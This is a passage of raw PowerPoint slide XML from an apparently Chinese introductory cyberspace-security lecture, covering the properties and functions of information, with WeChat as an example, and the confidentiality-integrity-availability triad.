dP7sjD9ajq5q426xdgf89Cf5VSr89rLlqSXm/zP2zCz5qEJeS/JC0UlFZm4tFJRQAYzit7wpNi8uIv78QP61g1q+HCRraqOmwiuzLpcuKpvzPKzumqmXVk/wCVv7rHY96Wg0ma+6ufkQtFJmjNFwFopM0ZouBHO22MmikuOYsf560V8dnuJnDFcq7L9T6zJKFOWGvJdWf/2Q=="/>
          <p:cNvSpPr>
            <a:spLocks noChangeAspect="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="444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2132856"/>
            <a:ext cx="3356992" cy="3356992"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="矩形 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2307140" y="1267080"/>
            <a:ext cx="6316153" cy="523220"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" b="1" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>针对微信通信，如何理解信息的性质？</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="2800" dirty="0">
              <a:latin typeface="+mn-ea"/>
              <a:ea typeface="+mn-ea"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="20" name="矩形 19"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4283968" y="2107398"/>
            <a:ext cx="2232248" cy="3631763"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>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依附性</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" b="1" dirty="0">
                <a:latin typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>：</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2000" b="1" dirty="0">
              <a:latin typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>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动态性</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" b="1" dirty="0">
                <a:latin typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>：</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2000" b="1" dirty="0">
              <a:latin typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>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可处理性：</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2000" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0033CC"/>
              </a:solidFill>
              <a:latin typeface="+mn-ea"/>
              <a:ea typeface="+mn-ea"/>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共享性：</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2000" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0033CC"/>
              </a:solidFill>
              <a:latin typeface="+mn-ea"/>
              <a:ea typeface="+mn-ea"/>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可传递性：</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2000" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0033CC"/>
              </a:solidFill>
              <a:latin typeface="+mn-ea"/>
              <a:ea typeface="+mn-ea"/>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异步性：</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="2000" b="1" dirty="0">
              <a:latin typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>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可交换性：</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2000" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0033CC"/>
              </a:solidFill>
              <a:latin typeface="+mn-ea"/>
              <a:ea typeface="+mn-ea"/>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可伪性：</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2000" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0033CC"/>
              </a:solidFill>
              <a:latin typeface="+mn-ea"/>
              <a:ea typeface="+mn-ea"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2601032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p:stCondLst>
                              <p:cond delay="500"/>
                            </p:stCondLst>
                            <p:childTnLst>
                              <p:par>
                                <p:cTn id="11" presetID="2" presetClass="entr" presetSubtype="2"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1+#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44418"/>
            <a:ext cx="6513512" cy="487363"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="50000"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>  信息的功能</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="矩形 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="723368" y="1817943"/>
            <a:ext cx="7992888" cy="461665"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr lvl="1" eaLnBrk="1" hangingPunct="1">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="50000"/>
              </a:spcBef>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>基本功能：</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" b="1" dirty="0">
                <a:latin typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>在于维持和强化世界的有序性动态性</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text Box 4"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="401484" y="3990243"/>
            <a:ext cx="8132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defRPr kumimoji="1" sz="4800" b="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="隶书" panose="02010509060101010101" pitchFamily="49" charset="-122"/>
                <a:ea typeface="隶书" panose="02010509060101010101" pitchFamily="49" charset="-122"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="742950" indent="-285750">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:defRPr kumimoji="1" sz="4800" b="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="隶书" panose="02010509060101010101" pitchFamily="49" charset="-122"/>
                <a:ea typeface="隶书" panose="02010509060101010101" pitchFamily="49" charset="-122"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="1143000" indent="-228600">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:defRPr kumimoji="1" sz="4800" b="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="隶书" panose="02010509060101010101" pitchFamily="49" charset="-122"/>
                <a:ea typeface="隶书" panose="02010509060101010101" pitchFamily="49" charset="-122"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1600200" indent="-228600">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:defRPr kumimoji="1" sz="4800" b="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="隶书" panose="02010509060101010101" pitchFamily="49" charset="-122"/>
                <a:ea typeface="隶书" panose="02010509060101010101" pitchFamily="49" charset="-122"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="2057400" indent="-228600">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:defRPr kumimoji="1" sz="4800" b="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="隶书" panose="02010509060101010101" pitchFamily="49" charset="-122"/>
                <a:ea typeface="隶书" panose="02010509060101010101" pitchFamily="49" charset="-122"/>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr marL="25146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6pPr>
            <a:lvl7pPr marL="29718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7pPr>
            <a:lvl8pPr marL="34290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8pPr>
            <a:lvl9pPr marL="38862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9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr algn="ctr" eaLnBrk="1" hangingPunct="1">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="50000"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" dirty="0">
                <a:latin typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>网络空间安全的任务就是确保信息功能的正确实现</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="矩形 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="723368" y="2492896"/>
            <a:ext cx="7488832" cy="830997"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr lvl="1" eaLnBrk="1" hangingPunct="1">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="50000"/>
              </a:spcBef>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>社会功能：</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" b="1" dirty="0">
                <a:latin typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>表现为维系社会的生存、促进人类文明的进步和自身的发展 </a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="32480067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782073"/>
            <a:ext cx="6513512" cy="487363"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>信息与</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>网络空间</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>安全</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="内容占位符 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="712724" y="1504181"/>
            <a:ext cx="8191500" cy="698797"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:sym typeface="Arial" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>信息: 数据/信息流</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="14" name="组合 13"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="683568" y="3040980"/>
            <a:ext cx="4787900" cy="892176"/>
            <a:chOff x="683568" y="3040980"/>
            <a:chExt cx="4787900" cy="892176"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="5" name="Rectangle 5"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="683568" y="3040980"/>
              <a:ext cx="908050" cy="838200"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:gradFill rotWithShape="0">
              <a:gsLst>
                <a:gs pos="0">
                  <a:srgbClr val="CC99FF">
                    <a:gamma/>
                    <a:shade val="46275"/>
                    <a:invGamma/>
                  </a:srgbClr>
                </a:gs>
                <a:gs pos="100000">
                  <a:srgbClr val="CC99FF"/>
                </a:gs>
              </a:gsLst>
              <a:lin ang="2700000" scaled="1"/>
            </a:gradFill>
            <a:ln w="9525">
              <a:noFill/>
              <a:miter lim="800000"/>
              <a:headEnd/>
              <a:tailEnd/>
            </a:ln>
            <a:effectLst/>
          </p:spPr>
          <p:txBody>
            <a:bodyPr wrap="none" anchor="ctr"/>
            <a:lstStyle/>
            <a:p>
              <a:pPr algn="ctr" eaLnBrk="1" hangingPunct="1">
                <a:defRPr/>
              </a:pPr>
              <a:r>
                <a:rPr lang="en-GB" altLang="zh-CN" sz="5400">
                  <a:effectLst>
                    <a:outerShdw blurRad="38100" dist="38100" dir="2700000" algn="tl">
                      <a:srgbClr val="FFFFFF"/>
                    </a:outerShdw>
                  </a:effectLst>
                  <a:latin typeface="Arial" charset="0"/>
                </a:rPr>
                <a:t>C</a:t>
              </a:r>
              <a:endParaRPr lang="en-US" altLang="zh-CN">
                <a:latin typeface="Arial" charset="0"/>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="8" name="Text Box 8"/>
            <p:cNvSpPr txBox="1">
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="1591618" y="3109243"/>
              <a:ext cx="3879850" cy="823913"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:noFill/>
            <a:ln w="9525">
              <a:noFill/>
              <a:miter lim="800000"/>
              <a:headEnd/>
              <a:tailEnd/>
            </a:ln>
            <a:effectLst/>
          </p:spPr>
          <p:txBody>
            <a:bodyPr wrap="square">
              <a:spAutoFit/>
            </a:bodyPr>
            <a:lstStyle/>
            <a:p>
              <a:pPr eaLnBrk="1" hangingPunct="1">
                <a:defRPr/>
              </a:pPr>
              <a:r>
                <a:rPr lang="en-GB" altLang="zh-CN" sz="4800" dirty="0" err="1">
                  <a:effectLst>
                    <a:outerShdw blurRad="38100" dist="38100" dir="2700000" algn="tl">
                      <a:srgbClr val="C0C0C0"/>
                    </a:outerShdw>
                  </a:effectLst>
                  <a:latin typeface="Arial" charset="0"/>
                </a:rPr>
                <a:t>onfidentiality</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-GB" altLang="zh-CN" sz="4800" dirty="0">
                  <a:effectLst>
                    <a:outerShdw blurRad="38100" dist="38100" dir="2700000" algn="tl">
                      <a:srgbClr val="C0C0C0"/>
                    </a:outerShdw>
                  </a:effectLst>
                  <a:latin typeface="Arial" charset="0"/>
                </a:rPr>
                <a:t> </a:t>
              </a:r>
              <a:endParaRPr lang="en-US" altLang="zh-CN" sz="4800" dirty="0">
                <a:latin typeface="Arial" charset="0"/>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="15" name="组合 14"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="683568" y="4049043"/>
            <a:ext cx="4392488" cy="892175"/>
            <a:chOff x="683568" y="4049043"/>
            <a:chExt cx="4392488" cy="892175"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="6" name="Rectangle 6"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="683568" y="4049043"/>
              <a:ext cx="908050" cy="838200"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:gradFill rotWithShape="0">
              <a:gsLst>
                <a:gs pos="0">
                  <a:srgbClr val="CC99FF">
                    <a:gamma/>
                    <a:shade val="46275"/>
                    <a:invGamma/>
                  </a:srgbClr>
                </a:gs>
                <a:gs pos="100000">
                  <a:srgbClr val="CC99FF"/>
                </a:gs>
              </a:gsLst>
              <a:lin ang="2700000" scaled="1"/>
            </a:gradFill>
            <a:ln w="9525">
              <a:noFill/>
              <a:miter lim="800000"/>
              <a:headEnd/>
              <a:tailEnd/>
            </a:ln>
            <a:effectLst/>
          </p:spPr>
          <p:txBody>
            <a:bodyPr wrap="none" anchor="ctr"/>
            <a:lstStyle/>
            <a:p>
              <a:pPr algn="ctr" eaLnBrk="1" hangingPunct="1">
                <a:defRPr/>
              </a:pPr>
              <a:r>
                <a:rPr lang="en-GB" altLang="zh-CN" sz="5400">
                  <a:effectLst>
                    <a:outerShdw blurRad="38100" dist="38100" dir="2700000" algn="tl">
                      <a:srgbClr val="FFFFFF"/>
                    </a:outerShdw>
                  </a:effectLst>
                  <a:latin typeface="Arial" charset="0"/>
                </a:rPr>
                <a:t>I</a:t>
              </a:r>
              <a:endParaRPr lang="en-US" altLang="zh-CN">
                <a:latin typeface="Arial" charset="0"/>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="9" name="Text Box 9"/>
            <p:cNvSpPr txBox="1">
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="1591618" y="4117305"/>
              <a:ext cx="3484438" cy="823913"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:noFill/>
            <a:ln w="9525">
              <a:noFill/>
              <a:miter lim="800000"/>
              <a:headEnd/>
              <a:tailEnd/>
            </a:ln>
            <a:effectLst/>
          </p:spPr>
          <p:txBody>
            <a:bodyPr wrap="square">
              <a:spAutoFit/>
            </a:bodyPr>
            <a:lstStyle/>
            <a:p>
              <a:pPr eaLnBrk="1" hangingPunct="1">
                <a:defRPr/>
              </a:pPr>
              <a:r>
                <a:rPr lang="en-GB" altLang="zh-CN" sz="4800" dirty="0" err="1">
                  <a:effectLst>
                    <a:outerShdw blurRad="38100" dist="38100" dir="2700000" algn="tl">
                      <a:srgbClr val="C0C0C0"/>
                    </a:outerShdw>
                  </a:effectLst>
                  <a:latin typeface="Arial" charset="0"/>
                </a:rPr>
                <a:t>ntegrity</a:t>
              </a:r>
              <a:endParaRPr lang="en-US" altLang="zh-CN" sz="4800" dirty="0">
                <a:latin typeface="Arial" charset="0"/>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="16" name="组合 15"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="683568" y="5052343"/>
            <a:ext cx="3960440" cy="896938"/>
            <a:chOff x="683568" y="5052343"/>
            <a:chExt cx="3960440" cy="896938"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="7" name="Rectangle 7"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="683568" y="5052343"/>
              <a:ext cx="908050" cy="838200"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:gradFill rotWithShape="0">
              <a:gsLst>
                <a:gs pos="0">
                  <a:srgbClr val="CC99FF">
                    <a:gamma/>
                    <a:shade val="46275"/>
                    <a:invGamma/>
                  </a:srgbClr>
                </a:gs>
                <a:gs pos="100000">
                  <a:srgbClr val="CC99FF"/>
                </a:gs>
              </a:gsLst>
              <a:lin ang="2700000" scaled="1"/>
            </a:gradFill>
            <a:ln w="9525">
              <a:noFill/>
              <a:miter lim="800000"/>
              <a:headEnd/>
              <a:tailEnd/>
            </a:ln>
            <a:effectLst/>
          </p:spPr>
          <p:txBody>
            <a:bodyPr wrap="none" anchor="ctr"/>
            <a:lstStyle/>
            <a:p>
              <a:pPr algn="ctr" eaLnBrk="1" hangingPunct="1">
                <a:defRPr/>
              </a:pPr>
              <a:r>
                <a:rPr lang="en-GB" altLang="zh-CN" sz="5400" dirty="0">
                  <a:effectLst>
                    <a:outerShdw blurRad="38100" dist="38100" dir="2700000" algn="tl">
                      <a:srgbClr val="FFFFFF"/>
                    </a:outerShdw>
                  </a:effectLst>
                  <a:latin typeface="Arial" charset="0"/>
                </a:rPr>
                <a:t>A</a:t>
              </a:r>
              <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:latin typeface="Arial" charset="0"/>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="10" name="Text Box 10"/>
            <p:cNvSpPr txBox="1">
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="1591618" y="5125368"/>
              <a:ext cx="3052390" cy="823913"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:noFill/>
            <a:ln w="9525">
              <a:noFill/>
              <a:miter lim="800000"/>
              <a:headEnd/>
              <a:tailEnd/>
            </a:ln>
            <a:effectLst/>
          </p:spPr>
          <p:txBody>
            <a:bodyPr wrap="square">
              <a:spAutoFit/>
            </a:bodyPr>
            <a:lstStyle/>
            <a:p>
              <a:pPr eaLnBrk="1" hangingPunct="1">
                <a:defRPr/>
              </a:pPr>
              <a:r>
                <a:rPr lang="en-GB" altLang="zh-CN" sz="4800" dirty="0" err="1">
                  <a:effectLst>
                    <a:outerShdw blurRad="38100" dist="38100" dir="2700000" algn="tl">
                      <a:srgbClr val="C0C0C0"/>
                    </a:outerShdw>
                  </a:effectLst>
                  <a:latin typeface="Arial" charset="0"/>
                </a:rPr>
                <a:t>vailability</a:t>
              </a:r>
              <a:endParaRPr lang="en-US" altLang="zh-CN" sz="4800" dirty="0">
                <a:latin typeface="Arial" charset="0"/>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="17" name="组合 16"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="5004048" y="2676648"/>
            <a:ext cx="3509962" cy="2881313"/>
            <a:chOff x="5287318" y="3066380"/>
            <a:chExt cx="3509962" cy="2881313"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="11" name="AutoShape 11"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="5287318" y="3066380"/>
              <a:ext cx="3509962" cy="2881313"/>
            </a:xfrm>
            <a:prstGeom prst="triangle">
              <a:avLst>
                <a:gd name="adj" fmla="val 50000"/>
              </a:avLst>
            </a:prstGeom>
            <a:gradFill rotWithShape="1">
              <a:gsLst>
                <a:gs pos="0">
                  <a:srgbClr val="760000"/>
                </a:gs>
                <a:gs pos="50000">
                  <a:srgbClr val="FF0000"/>
                </a:gs>
                <a:gs pos="100000">
                  <a:srgbClr val="760000"/>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F76909"/>
              </a:extrusionClr>
              <a:contourClr>
                <a:srgbClr val="760000"/>
              </a:contourClr>
            </a:sp3d>
          </p:spPr>
          <p:txBody>
            <a:bodyPr wrap="none" anchor="ctr">
              <a:flatTx/>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12" name="Text Box 12"/>
            <p:cNvSpPr txBox="1">
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="5874693" y="4418930"/>
              <a:ext cx="2339975" cy="762000"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:noFill/>
            <a:ln w="9525" algn="ctr">
              <a:noFill/>
              <a:miter lim="800000"/>
              <a:headEnd/>
              <a:tailEnd/>
            </a:ln>
            <a:effectLst/>
          </p:spPr>
          <p:txBody>
            <a:bodyPr>
              <a:spAutoFit/>
            </a:bodyPr>
            <a:lstStyle/>
            <a:p>
              <a:pPr algn="ctr" eaLnBrk="1" hangingPunct="1">
                <a:spcBef>
                  <a:spcPct val="50000"/>
                </a:spcBef>
                <a:defRPr/>
              </a:pPr>
              <a:r>
                <a:rPr lang="en-US" altLang="zh-CN" sz="4400" dirty="0">
                  <a:solidFill>
                    <a:srgbClr val="FFFF66"/>
                  </a:solidFill>
                  <a:effectLst>
                    <a:outerShdw blurRad="38100" dist="38100" dir="2700000" algn="tl">
                      <a:srgbClr val="C0C0C0"/>
                    </a:outerShdw>
                  </a:effectLst>
                  <a:latin typeface="黑体" pitchFamily="2" charset="-122"/>
                  <a:ea typeface="黑体" pitchFamily="2" charset="-122"/>
                </a:rPr>
                <a:t>CIA</a:t>
              </a:r>
